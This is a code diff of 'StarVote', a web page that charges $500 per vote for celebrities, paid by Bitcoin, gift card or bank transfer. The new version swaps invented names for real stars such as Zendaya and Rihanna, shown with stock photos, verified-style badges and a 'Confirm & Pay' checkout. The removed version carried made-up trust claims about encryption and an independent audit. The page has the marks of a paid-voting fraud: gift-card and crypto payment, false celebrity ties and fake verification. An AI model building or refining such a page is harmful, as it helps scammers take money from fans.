-            <p class="text-sm font-semibold text-slate-900 truncate" x-text="toast.title"></p>
-            <p class="text-xs text-slate-500 mt-0.5 truncate" x-text="toast.message"></p>
+        <h1 class="text-3xl sm:text-4xl font-extrabold tracking-tight text-slate-900">
+          Vote for Your Favorite Celebrity
+        </h1>
+        <p class="mt-2.5 text-sm sm:text-base text-slate-500">
+          Select a nominee below to cast your vote. Every vote counts toward the 2026 annual ranking.
+        </p>
+      </div>
+
+      <!-- Celebrity Grid -->
+      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
+        <template x-for="celeb in celebrities" :key="celeb.id">
+          <div class="group bg-white rounded-2xl border border-slate-200/80 p-3 shadow-sm hover:shadow-xl hover:shadow-blue-900/5 hover:border-blue-200 transition-all duration-300 flex flex-col">
+            
+            <!-- Portrait Image Container -->
+            <div class="relative aspect-[4/5] w-full rounded-xl overflow-hidden bg-slate-100">
+              <img
+                :src="celeb.image"
+                :alt="celeb.name"
+                class="w-full h-full object-cover object-center group-hover:scale-105 transition-transform duration-500"
+                loading="lazy"
+              />
+              <!-- Subtle Top Badge if User Voted -->
+              <template x-if="celeb.userVotes > 0">
+                <div class="absolute top-3 right-3 px-2.5 py-1 rounded-full bg-blue-600/95 backdrop-blur-sm text-white text-[11px] font-semibold shadow-sm flex items-center gap-1">
+                  <i data-lucide="check" class="w-3 h-3"></i>
+                  <span x-text="celeb.userVotes + (celeb.userVotes === 1 ? ' Vote' : ' Votes')"></span>
+                </div>
+              </template>
+            </div>
+
+            <!-- Celebrity Name & Vote Button -->
+            <div class="pt-4 pb-1 px-1 flex flex-col flex-1 justify-between gap-4">
+              <div class="flex items-center justify-between gap-2">
+                <div class="flex items-center gap-1.5 min-w-0">
+                  <h2 class="font-bold text-base text-slate-900 truncate" x-text="celeb.name"></h2>
+                  <!-- Verified Blue Badge -->
+                  <svg class="w-4 h-4 text-blue-600 shrink-0" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-1.9 14.7L6 12.6l1.5-1.5 2.6 2.6 6.4-6.4 1.5 1.5-7.9 7.9z"/>
+                  </svg>
+                </div>
+              </div>
+
+              <button
+                type="button"
+                @click="openVoteModal(celeb)"
+                class="w-full py-2.5 px-4 rounded-xl font-semibold text-sm flex items-center justify-center gap-2 transition-all duration-200 cursor-pointer"
+                :class="celeb.userVotes > 0
+                  ? 'bg-blue-50 text-blue-700 border border-blue-200 hover:bg-blue-600 hover:text-white hover:border-blue-600'
+                  : 'bg-blue-600 text-white hover:bg-blue-700 shadow-sm shadow-blue-600/20 active:scale-[0.99]'"
+              >
+                <i data-lucide="credit-card" class="w-4 h-4"></i>
+                <span x-text="celeb.userVotes > 0 ? 'Vote Again' : 'Vote'"></span>
+              </button>
+            </div>
+          </div>
+        </template>
+      </div>
+    </div>
+  </main>
+
+  <!-- Simple Minimal Footer -->
+  <footer class="bg-white border-t border-slate-100">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6 py-6 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-slate-400">
+      <div class="flex items-center gap-2 font-medium text-slate-600">
+        <span class="w-2 h-2 rounded-full bg-blue-600"></span>
+        <span>StarVote © 2026. All rights reserved.</span>
+      </div>
+      <div class="flex items-center gap-6">
+        <a href="#" class="hover:text-blue-600 transition">Terms</a>
+        <a href="#" class="hover:text-blue-600 transition">Privacy</a>
+        <a href="#" class="hover:text-blue-600 transition">Support</a>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Minimal Vote Checkout Modal -->
+  <div
+    x-show="modalOpen"
+    x-cloak
+    class="fixed inset-0 z-50 flex items-center justify-center p-4"
+    @keydown.escape.window="closeModal()"
+  >
+    <!-- Backdrop -->
+    <div
+      x-show="modalOpen"
+      x-transition:enter="ease-out duration-200"
+      x-transition:enter-start="opacity-0"
+      x-transition:enter-end="opacity-100"
+      x-transition:leave="ease-in duration-150"
+      x-transition:leave-start="opacity-100"
+      x-transition:leave-end="opacity-0"
+      @click="closeModal()"
+      class="fixed inset-0 bg-slate-900/40 backdrop-blur-xs"
+    ></div>
+
+    <!-- Modal Panel -->
+    <div
+      x-show="modalOpen"
+      x-transition:enter="ease-out duration-200"
+      x-transition:enter-start="opacity-0 scale-95 translate-y-2"
+      x-transition:enter-end="opacity-100 scale-100 translate-y-0"
+      x-transition:leave="ease-in duration-150"
+      x-transition:leave-start="opacity-100 scale-100 translate-y-0"
+      x-transition:leave-end="opacity-0 scale-95 translate-y-2"
+      class="relative w-full max-w-md bg-white rounded-3xl border border-slate-100 shadow-2xl p-6 z-10"
+    >
+      <!-- Modal Header -->
+      <div class="flex items-center justify-between pb-4 border-b border-slate-100">
+        <div class="flex items-center gap-3">
+          <img
+            :src="selectedCeleb?.image"
+            :alt="selectedCeleb?.name"
+            class="w-11 h-11 rounded-full object-cover ring-2 ring-blue-100"
+          />
+          <div>
+            <p class="text-[11px] font-semibold uppercase tracking-wider text-blue-600">Cast Vote</p>
+            <h3 class="text-base font-bold text-slate-900" x-text="selectedCeleb?.name"></h3>
+          </div>
         </div>
-        <button @click="toast.visible = false" class="text-slate-400 hover:text-slate-600 p-1 rounded-lg transition-colors cursor-pointer" aria-label="Close notification">
-            <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <line x1="18" y1="6" x2="6" y2="18"></line>
-                <line x1="6" y1="6" x2="18" y2="18"></line>
-            </svg>
+        <button
+          type="button"
+          @click="closeModal()"
+          class="w-8 h-8 rounded-full bg-slate-50 hover:bg-slate-100 text-slate-400 hover:text-slate-600 flex items-center justify-center transition cursor-pointer"
+        >
+          <i data-lucide="x" class="w-4 h-4"></i>
         </button>
-    </div>
+      </div>
 
-    <!-- Ultra-Minimal Clean Footer -->
-    <footer class="border-t border-slate-200/80 bg-white mt-auto">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-7 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs sm:text-sm text-slate-500">
-            <div class="flex items-center gap-2.5">
-                <span class="font-display font-bold text-slate-900">&copy; 2026 Star<span class="text-blue-600">Vote</span></span>
-                <span class="text-slate-300">•</span>
-                <span>Official Public Voting</span>
-            </div>
-            
-            <div class="flex items-center gap-6">
-                <a href="#privacy" @click.prevent="showToast('Privacy Policy', 'All votes are encrypted and anonymized.')" class="hover:text-blue-600 transition-colors">Privacy</a>
-                <a href="#terms" @click.prevent="showToast('Terms of Service', 'Official 2026 voting terms apply to all submissions.')" class="hover:text-blue-600 transition-colors">Terms</a>
-                <a href="#audit" @click.prevent="showToast('Independent Audit', 'Live vote counts are verified in real time.')" class="hover:text-blue-600 transition-colors">Audit</a>
-            </div>
+      <!-- Number of Votes Stepper (Only - / +) -->
+      <div class="mt-5">
+        <div class="flex items-center justify-between mb-2">
+          <label class="text-xs font-semibold text-slate-700">Number of Votes</label>
+          <span class="text-xs font-medium text-slate-400">$500 / vote</span>
         </div>
-    </footer>
 
-    <!-- Alpine.js State & Logic -->
-    <script>
-        function celebVoteApp() {
-            return {
-                pricePerVote: 500,
-                modal: {
-                    open: false,
-                    celeb: null,
-                    quantity: 1,
-                    paymentMethod: 'bitcoin',
-                    giftcardBrand: 'Apple / iTunes',
-                    giftcardCode: '',
-                    copiedField: '',
-                    processing: false
-                },
-                toast: {
-                    visible: false,
-                    title: '',
-                    message: '',
-                    timeout: null
-                },
-                celebrities: [
-                    {
-                        id: 1,
-                        name: 'Elena Vance',
-                        role: 'Film & Drama',
-                        votes: 14280,
-                        userVotes: 0,
-                        voted: false,
-                        image: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=800&q=85'
-                    },
-                    {
-                        id: 2,
-                        name: 'Marcus Sterling',
-                        role: 'Music Artist',
-                        votes: 18940,
-                        userVotes: 0,
-                        voted: false,
-                        image: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=800&q=85'
-                    },
-                    {
-                        id: 3,
-                        name: 'Sora Takahashi',
-                        role: 'Cinema & Stage',
-                        votes: 12615,
-                        userVotes: 0,
-                        voted: false,
-                        image: 'https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&w=800&q=85'
-                    },
-                    {
-                        id: 4,
-                        name: 'Julian Mercer',
-                        role: 'Recording Artist',
-                        votes: 15430,
-                        userVotes: 0,
-                        voted: false,
-                        image: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=800&q=85'
-                    },
-                    {
-                        id: 5,
-                        name: 'Amara Okafor',
-                        role: 'Lead Actress',
-                        votes: 21105,
-                        userVotes: 0,
-                        voted: false,
-                        image: 'https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?auto=format&fit=crop&w=800&q=85'
-                    },
-                    {
-                        id: 6,
-                        name: 'Lucas Lindqvist',
-                        role: 'Director & Actor',
-                        votes: 9870,
-                        userVotes: 0,
-                        voted: false,
-                        image: 'https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?auto=format&fit=crop&w=800&q=85'
-                    },
-                    {
-                        id: 7,
-                        name: 'Camila Morales',
-                        role: 'Pop Vocalist',
-                        votes: 17320,
-                        userVotes: 0,
-                        voted: false,
-                        image: 'https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&w=800&q=85'
-                    },
-                    {
-                        id: 8,
-                        name: 'Devon Brooks',
-                        role: 'Comedy & TV',
-                        votes: 11490,
-                        userVotes: 0,
-                        voted: false,
-                        image: 'https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?auto=format&fit=crop&w=800&q=85'
-                    }
-                ],
+        <div class="flex items-center justify-between bg-slate-50 border border-slate-200/80 rounded-2xl p-1.5">
+          <button
+            type="button"
+            @click="decrementVotes()"
+            :disabled="voteQuantity <= 1"
+            class="w-11 h-11 rounded-xl bg-white border border-slate-200/80 text-slate-700 hover:border-blue-300 hover:text-blue-600 disabled:opacity-40 disabled:pointer-events-none flex items-center justify-center shadow-2xs transition cursor-pointer"
+          >
+            <i data-lucide="minus" class="w-4 h-4"></i>
+          </button>
 
-                get totalVotes() {
-                    return this.celebrities.reduce((sum, celeb) => sum + celeb.votes, 0);
-                },
+          <input
+            type="number"
+            min="1"
+            max="1000"
+            x-model.number="voteQuantity"
+            @input="sanitizeQuantity()"
+            class="w-24 text-center bg-transparent text-xl font-extrabold text-slate-900 focus:outline-none"
+          />
 
-                get safeQuantity() {
-                    const parsed = parseInt(this.modal.quantity, 10);
-                    return Number.isFinite(parsed) && parsed >= 1 ? parsed : 1;
-                },
+          <button
+            type="button"
+            @click="incrementVotes()"
+            class="w-11 h-11 rounded-xl bg-white border border-slate-200/80 text-slate-700 hover:border-blue-300 hover:text-blue-600 flex items-center justify-center shadow-2xs transition cursor-pointer"
+          >
+            <i data-lucide="plus" class="w-4 h-4"></i>
+          </button>
+        </div>
+      </div>
 
-                get checkoutTotal() {
-                    return this.safeQuantity * this.pricePerVote;
-                },
+      <!-- Payment Method Options (Clean Selectable Cards Only) -->
+      <div class="mt-5">
+        <label class="block text-xs font-semibold text-slate-700 mb-2.5">Payment Method</label>
+        <div class="space-y-2.5">
+          
+          <!-- Option 1: Bitcoin -->
+          <button
+            type="button"
+            @click="paymentMethod = 'Bitcoin'"
+            class="w-full flex items-center justify-between p-3.5 rounded-2xl border transition-all cursor-pointer text-left"
+            :class="paymentMethod === 'Bitcoin'
+              ? 'border-blue-600 bg-blue-50/40 ring-2 ring-blue-600/15'
+              : 'border-slate-200/80 bg-white hover:border-slate-300'"
+          >
+            <div class="flex items-center gap-3">
+              <div
+                class="w-9 h-9 rounded-xl flex items-center justify-center transition"
+                :class="paymentMethod === 'Bitcoin' ? 'bg-blue-600 text-white' : 'bg-slate-100 text-slate-600'"
+              >
+                <i data-lucide="bitcoin" class="w-4 h-4"></i>
+              </div>
+              <span class="text-sm font-semibold text-slate-900">Bitcoin</span>
+            </div>
+            <div
+              class="w-4 h-4 rounded-full border flex items-center justify-center transition"
+              :class="paymentMethod === 'Bitcoin' ? 'border-blue-600' : 'border-slate-300'"
+            >
+              <div x-show="paymentMethod === 'Bitcoin'" class="w-2 h-2 rounded-full bg-blue-600"></div>
+            </div>
+          </button>
 
-                get paymentMethodLabel() {
-                    if (this.modal.paymentMethod === 'bitcoin') return 'Bitcoin';
-                    if (this.modal.paymentMethod === 'giftcard') return `Giftcard (${this.modal.giftcardBrand})`;
-                    return 'Bank Transfer';
-                },
+          <!-- Option 2: Giftcard -->
+          <button
+            type="button"
+            @click="paymentMethod = 'Giftcard'"
+            class="w-full flex items-center justify-between p-3.5 rounded-2xl border transition-all cursor-pointer text-left"
+            :class="paymentMethod === 'Giftcard'
+              ? 'border-blue-600 bg-blue-50/40 ring-2 ring-blue-600/15'
+              : 'border-slate-200/80 bg-white hover:border-slate-300'"
+          >
+            <div class="flex items-center gap-3">
+              <div
+                class="w-9 h-9 rounded-xl flex items-center justify-center transition"
+                :class="paymentMethod === 'Giftcard' ? 'bg-blue-600 text-white' : 'bg-slate-100 text-slate-600'"
+              >
+                <i data-lucide="gift" class="w-4 h-4"></i>
+              </div>
+              <span class="text-sm font-semibold text-slate-900">Giftcard</span>
+            </div>
+            <div
+              class="w-4 h-4 rounded-full border flex items-center justify-center transition"
+              :class="paymentMethod === 'Giftcard' ? 'border-blue-600' : 'border-slate-300'"
+            >
+              <div x-show="paymentMethod === 'Giftcard'" class="w-2 h-2 rounded-full bg-blue-600"></div>
+            </div>
+          </button>
 
-                initIcons() {
-                    this.$nextTick(() => {
-                        if (window.lucide) {
-                            lucide.createIcons();
-                        }
-                    });
-                },
+          <!-- Option 3: Bank Transfer -->
+          <button
+            type="button"
+            @click="paymentMethod = 'Bank Transfer'"
+            class="w-full flex items-center justify-between p-3.5 rounded-2xl border transition-all cursor-pointer text-left"
+            :class="paymentMethod === 'Bank Transfer'
+              ? 'border-blue-600 bg-blue-50/40 ring-2 ring-blue-600/15'
+              : 'border-slate-200/80 bg-white hover:border-slate-300'"
+          >
+            <div class="flex items-center gap-3">
+              <div
+                class="w-9 h-9 rounded-xl flex items-center justify-center transition"
+                :class="paymentMethod === 'Bank Transfer' ? 'bg-blue-600 text-white' : 'bg-slate-100 text-slate-600'"
+              >
+                <i data-lucide="landmark" class="w-4 h-4"></i>
+              </div>
+              <span class="text-sm font-semibold text-slate-900">Bank Transfer</span>
+            </div>
+            <div
+              class="w-4 h-4 rounded-full border flex items-center justify-center transition"
+              :class="paymentMethod === 'Bank Transfer' ? 'border-blue-600' : 'border-slate-300'"
+            >
+              <div x-show="paymentMethod === 'Bank Transfer'" class="w-2 h-2 rounded-full bg-blue-600"></div>
+            </div>
+          </button>
 
-                formatNumber(num) {
-                    return num.toLocaleString('en-US');
-                },
+        </div>
+      </div>
 
-                formatCurrency(amount) {
-                    return '$' + amount.toLocaleString('en-US');
-                },
+      <!-- Checkout Total Summary -->
+      <div class="mt-5 pt-4 border-t border-slate-100 flex items-center justify-between">
+        <div>
+          <p class="text-xs text-slate-400">Total Amount</p>
+          <p class="text-xs font-medium text-slate-600" x-text="voteQuantity + (voteQuantity === 1 ? ' Vote' : ' Votes') + ' • ' + paymentMethod"></p>
+        </div>
+        <div class="text-right">
+          <span class="text-2xl font-extrabold tracking-tight text-slate-900" x-text="'$' + totalPrice.toLocaleString()"></span>
+        </div>
+      </div>
 
-                sanitizeQuantity() {
-                    this.modal.quantity = this.safeQuantity;
-                },
+      <!-- Confirm & Pay CTA -->
+      <div class="mt-5">
+        <button
+          type="button"
+          @click="confirmVote()"
+          :disabled="isSubmitting"
+          class="w-full py-3.5 px-5 rounded-2xl bg-blue-600 hover:bg-blue-700 disabled:opacity-70 text-white font-semibold text-sm shadow-lg shadow-blue-600/25 flex items-center justify-center gap-2 transition cursor-pointer"
+        >
+          <template x-if="!isSubmitting">
+            <span class="flex items-center gap-2">
+              <i data-lucide="shield-check" class="w-4 h-4"></i>
+              <span x-text="'Confirm & Pay $' + totalPrice.toLocaleString()"></span>
+            </span>
+          </template>
+          <template x-if="isSubmitting">
+            <span class="flex items-center gap-2">
+              <svg class="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
+              </svg>
+              <span>Processing...</span>
+            </span>
+          </template>
+        </button>
+      </div>
+    </div>
+  </div>
 
-                incrementQuantity() {
-                    this.modal.quantity = this.safeQuantity + 1;
-                },
+  <!-- Minimal Toast Notification -->
+  <div
+    x-show="toast.visible"
+    x-cloak
+    x-transition:enter="ease-out duration-300"
+    x-transition:enter-start="opacity-0 translate-y-3"
+    x-transition:enter-end="opacity-100 translate-y-0"
+    x-transition:leave="ease-in duration-200"
+    x-transition:leave-start="opacity-100 translate-y-0"
+    x-transition:leave-end="opacity-0 translate-y-3"
+    class="fixed bottom-5 right-5 z-50 max-w-sm bg-slate-900 text-white px-4 py-3 rounded-2xl shadow-xl border border-slate-800 flex items-center gap-3 text-xs font-medium"
+  >
+    <div class="w-7 h-7 rounded-full bg-blue-600 flex items-center justify-center shrink-0">
+      <i data-lucide="check" class="w-4 h-4 text-white"></i>
+    </div>
+    <p x-text="toast.message"></p>
+  </div>
 
-                decrementQuantity() {
-                    if (this.safeQuantity > 1) {
-                        this.modal.quantity = this.safeQuantity - 1;
-                    }
-                },
+  <script>
+    function starVoteApp() {
+      return {
+        pricePerVote: 500,
+        totalVotes: 14820,
+        modalOpen: false,
+        selectedCeleb: null,
+        voteQuantity: 1,
+        paymentMethod: 'Bitcoin',
+        isSubmitting: false,
+        toast: {
+          visible: false,
+          message: '',
+          timeout: null
+        },
+        celebrities: [
+          {
+            id: 1,
+            name: 'Zendaya',
+            image: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=800&q=80',
+            userVotes: 0
+          },
+          {
+            id: 2,
+            name: 'Michael B. Jordan',
+            image: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=800&q=80',
+            userVotes: 0
+          },
+          {
+            id: 3,
+            name: 'Margot Robbie',
+            image: 'https://images.unsplash.com/photo-1544005313-94ddf0286df2?auto=format&fit=crop&w=800&q=80',
+            userVotes: 0
+          },
+          {
+            id: 4,
+            name: 'Timothée Chalamet',
+            image: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=800&q=80',
+            userVotes: 0
+          },
+          {
+            id: 5,
+            name: 'Rihanna',
+            image: 'https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?auto=format&fit=crop&w=800&q=80',
+            userVotes: 0
+          },
+          {
+            id: 6,
+            name: 'Idris Elba',
+            image: 'https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?auto=format&fit=crop&w=800&q=80',
+            userVotes: 0
+          },
+          {
+            id: 7,
+            name: 'Selena Gomez',
+            image: 'https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&w=800&q=80',
+            userVotes: 0
+          },
+          {
+            id: 8,
+            name: 'Chris Evans',
+            image: 'https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?auto=format&fit=crop&w=800&q=80',
+            userVotes: 0
+          }
+        ],
 
-                copyText(text, label) {
-                    const tempInput = document.createElement('input');
-                    tempInput.value = text;
-                    document.body.appendChild(tempInput);
-                    tempInput.select();
-                    try {
-                        document.execCommand('copy');
-                        this.modal.copiedField = label;
-                        setTimeout(() => {
-                            if (this.modal.copiedField === label) {
-                                this.modal.copiedField = '';
-                            }
-                        }, 2000);
-                    } catch (err) {
-                        console.error('Copy failed', err);
-                    }
-                    document.body.removeChild(tempInput);
-                },
+        get totalPrice() {
+          const qty = Math.max(1, parseInt(this.voteQuantity) || 1);
+          return qty * this.pricePerVote;
+        },
 
-                openVoteModal(celeb) {
-                    this.modal.celeb = celeb;
-                    this.modal.quantity = 1;
-                    this.modal.paymentMethod = 'bitcoin';
-                    this.modal.giftcardCode = '';
-                    this.modal.copiedField = '';
-                    this.modal.processing = false;
-                    this.modal.open = true;
-                },
-
-                closeModal() {
-                    if (this.modal.processing) return;
-                    this.modal.open = false;
-                },
-
-                confirmVote() {
-                    if (!this.modal.celeb || this.modal.processing) return;
-
-                    if (this.modal.paymentMethod === 'giftcard' && !this.modal.giftcardCode.trim()) {
-                        this.showToast('Giftcard Code Required', 'Please enter your giftcard PIN or code to continue.');
-                        return;
-                    }
-
-                    const qty = this.safeQuantity;
-                    const totalPaid = this.formatCurrency(this.checkoutTotal);
-                    const method = this.paymentMethodLabel;
-
-                    this.modal.processing = true;
-
-                    setTimeout(() => {
-                        const target = this.modal.celeb;
-                        target.voted = true;
-                        target.votes += qty;
-                        target.userVotes += qty;
-
-                        this.modal.processing = false;
-                        this.modal.open = false;
-
-                        this.showToast(
-                            `Payment & Vote Confirmed (${totalPaid})`,
-                            `${qty} ${qty === 1 ? 'vote' : 'votes'} recorded for ${target.name} via ${method}.`
-                        );
-                    }, 500);
-                },
-
-                showToast(title, message) {
-                    if (this.toast.timeout) {
-                        clearTimeout(this.toast.timeout);
-                    }
-                    this.toast.title = title;
-                    this.toast.message = message;
-                    this.toast.visible = true;
-
-                    this.toast.timeout = setTimeout(() => {
-                        this.toast.visible = false;
-                    }, 3600);
-                }
+        initIcons() {
+          this.$nextTick(() => {
+            if (window.lucide) {
+              lucide.createIcons();
             }
+          });
+        },
+
+        openVoteModal(celeb) {
+          this.selectedCeleb = celeb;
+          this.voteQuantity = 1;
+          this.paymentMethod = 'Bitcoin';
+          this.modalOpen = true;
+          this.initIcons();
+        },
+
+        closeModal() {
+          if (this.isSubmitting) return;
+          this.modalOpen = false;
+        },
+
+        incrementVotes() {
+          this.voteQuantity = (parseInt(this.voteQuantity) || 1) + 1;
+        },
+
+        decrementVotes() {
+          if (this.voteQuantity > 1) {
+            this.voteQuantity -= 1;
+          }
+        },
+
+        sanitizeQuantity() {
+          if (!this.voteQuantity || this.voteQuantity < 1) {
+            this.voteQuantity = 1;
+          }
+        },
+
+        confirmVote() {
+          if (!this.selectedCeleb || this.isSubmitting) return;
+          this.isSubmitting = true;
+
+          const qty = Math.max(1, parseInt(this.voteQuantity) || 1);
+          const amount = qty * this.pricePerVote;
+          const method = this.paymentMethod;
+          const celebName = this.selectedCeleb.name;
+
+          setTimeout(() => {
+            this.selectedCeleb.userVotes += qty;
+            this.totalVotes += qty;
+            this.isSubmitting = false;
+            this.modalOpen = false;
+            this.initIcons();
+            this.showToast(`Confirmed ${qty} ${qty === 1 ? 'vote' : 'votes'} ($${amount.toLocaleString()}) for ${celebName} via ${method}.`);
+          }, 600);
+        },
+
+        showToast(msg) {
+          if (this.toast.timeout) clearTimeout(this.toast.timeout);
+          this.toast.message = msg;
+          this.toast.visible = true;
+          this.initIcons();
+          this.toast.timeout = setTimeout(() => {
+            this.toast.visible = false;
+          }, 4000);
         }
-    </script>
+      };
+    }
+  </script>
 </body>
 </html>
